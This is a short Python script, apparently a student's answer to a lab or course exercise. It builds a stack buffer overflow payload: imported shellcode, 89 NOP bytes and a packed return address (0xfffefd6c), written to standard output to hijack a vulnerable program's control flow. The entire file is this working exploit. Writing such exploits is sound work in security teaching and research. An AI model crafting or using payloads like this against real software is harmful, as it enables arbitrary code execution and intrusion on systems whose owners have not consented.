#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(shellcode + b'\x90'*89 + pack('<I', 0xfffefd6c))
